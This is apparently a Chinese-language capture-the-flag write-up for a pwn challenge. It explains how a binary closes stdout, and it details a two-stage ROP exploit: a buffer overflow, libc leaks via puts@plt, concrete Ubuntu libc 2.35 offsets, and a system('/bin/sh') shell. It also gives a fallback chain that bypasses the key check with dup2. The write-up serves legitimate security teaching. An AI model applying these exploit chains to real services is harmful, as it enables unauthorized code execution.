## 2. 关键逻辑

```c
// 0x404080 初值 1
int flag = 1;

void put(long a /*rdi*/, long b /*rsi*/) {
    if (a == 0xdeadbeef && b == 0x9527) {        // <-- “一对密钥”
        dup2(2, 1);                              // fd1 := fd2  “dup2 生命线”
        puts("[+] Congratulation! The rights have been unlocked!");
    } else {
        dup2(2, 1);                              // 失败分支也 dup2，但随后 exit(0)
        printf("You don't know the rop! Go away!\n");
        exit(0);
    }
}

void vuln(void) {
    printf("Input your payload: \n");            // msg @0x404090（含换行）
    if (flag != 0) { close(1); flag--; }         // <-- “一片死寂”
    read(0, rbp-0x20, 0x100);                    // <-- 溢出：0x20 buffer + saved rbp
}
```

### “两个密钥”是什么

**`0xdeadbeef` 和 `0x9527`** —— 不是从内存里读出来的运行时数据，而是 `put()` 里
直接 `cmp` 的两个立即数。这就是题面说的“内存深处隐藏的一对密钥”：
呈递方式 = ROP 链里 `pop rdi; 0xdeadbeef` + `pop rsi; 0x9527` 再 `call put`。

### “死寂”的原因

`flag` 计数器初值 **1**，所以**只有第一次** `vuln()` 会执行 `close(1)`。
fd1 一关，之后所有 `puts/printf` 的泄露全都写进一个已关闭的 fd —— 本地终端与
远端 socket 都收不到任何东西，即“终端里只有一片死寂”。

`put()` 成功分支的 `dup2(2, 1)` 把 **fd1 重新接成 fd2**。在 inetd / xinetd /
`socat ...,stderr` 的部署下 fd2 就是同一个 socket，于是 stdout 复活 —— 这就是
“重新接通名为 dup2 的生命线”。**这也是本题唯一的设计前提**：远端 fd2 必须
等于 socket（若不等，见 §5 的 `--restore fd0` 兜底）。

## 3. 利用链

`flag` 计数器的第二个含义：第一次 `vuln()` 之后 `flag == 0`，
**再次进入 `vuln()` 就不会再 `close(1)`**。所以一次 ROP 就能把两阶段串完。

**stage 1**（单次 `read`，168 字节 < 0x100）：

```
'A'*40
pop rdi ; 0xdeadbeef
pop rsi ; 0x9527
ret                     (对齐)
put                     -> dup2(2,1)，fd1 复活
pop rdi ; puts@got
ret                     (对齐)
puts@plt                -> leak #1
pop rdi ; read@got
ret                     (对齐)
puts@plt                -> leak #2（换 libc 版本 / 交叉验证）
ret                     (对齐)
main                    -> 整个流程重跑；此时 flag==0，第二次 vuln() 不再 close(1)
```

**stage 2**：

```
'A'*40
pop rdi ; base + "/bin/sh"
ret                     (对齐)
base + system           -> 交互 shell（fd0/fd1 都是 socket）
```

两个泄露都用 **定长 `recvn(7)`**（6 字节地址 + `\n`）读取：
libc 地址的低位完全可能出现 `0x0a`，按行读会被截断。

对齐细节：`vuln` 的 `ret` 之后 `rsp % 16 == 0`，而 ABI 要求函数入口
`rsp % 16 == 8`，因此在每个被调函数前插一个裸 `ret`（`0x401144`）当雪橇。

## 4. libc 识别

泄露 `puts` + `read` 两个符号后：

1. `--libc <path>` 指定 → 直接读符号（本地复现用）。
2. 内置表命中（用两个泄露同时校验：base 页对齐 且 `read_leak - read_off == base`）。
3. 否则 POST `https://libc.rip/api/find`（两个泄露一起查），命中后校验同一组条件。

已核实（libc.rip + 下载真实 `.so` 双重验证，Ubuntu 22.04 各补丁版本 3.6/3.7/3.8/3.9/3.10 偏移一致）：

| libc | puts | read | system | /bin/sh |
|---|---|---|---|---|
| `libc6_2.35-0ubuntu3.x_amd64` | `0x80e50` | `0x1147d0` | `0x50d70` | `0x1d8678` |

> ⚠️ 注意：凭记忆常写的 `system=0x50d60` / `binsh=0x1d8698` 是**错的**（差 0x10/0x20），
> 直接用会崩。本仓库已下载真实 libc：`work/19_quiet/libc-2.35-ubuntu3.8.so`
> （buildid `490fef8403240c91833978d494d39e537409b92e`），可用

## 5. 兜底：绕开密钥门

`put()` 的本质就是 `dup2(2,1)`。可以直接 ROP `dup2@plt(rdi=0, rsi=1)`，
即 **fd1 := fd0（socket）**，完全不经过密钥门，且**不依赖 fd2 是不是 socket**。

```
pop rdi ; 0
pop rsi ; 1
ret                      (对齐)
dup2@plt
... 之后与 stage 1 尾部相同
```

脚本 `--restore key|fd0|auto`（默认 `auto`）：
先试 `key`，8 秒内收不到 `The rights have been unlocked!` 就自动重连换 `fd0`。
两个场景本地都实测通过。

> 注意 `fd0` 兜底只在 **fd0 是 socket**（或 pty）时成立；
> 用管道起的本地进程（`process()`）fd0 是只读端，`dup2(0,1)` 后写不出去 —— 这是
> 预期行为，不是 bug（见 §7 场景 C）。

## 7. 本地验证程度（全部实测通过）

`work/19_quiet/sockserv.py` 是 xinetd/socat 的最小替身：listen → fork →
`dup2(sock,0/1/2)` → `execv(pwn)`，真实还原远端拓扑。

| 场景 | 拓扑 | 结果 |
|---|---|---|
| A | fd0/1/2 = **同一个 socket**（预期部署） | ✅ `key` 一次通过，泄露 + shell |
| B | fd2 ≠ socket（模拟 `socat` 没加 `,stderr`） | ✅ `key` 失败后自动切 `fd0`，拿到 shell |
| C | 本地 `process()` 管道，强制 `fd0` | ❌ 预期失败：fd0 是管道只读端，`dup2(0,1)` 不可写 |

场景 A 的 `ls -la /` 与 `__PWNED__` 输出见 `evidence/19-local-socket.log`。

报错提示（打印两个泄露供人工查库）。
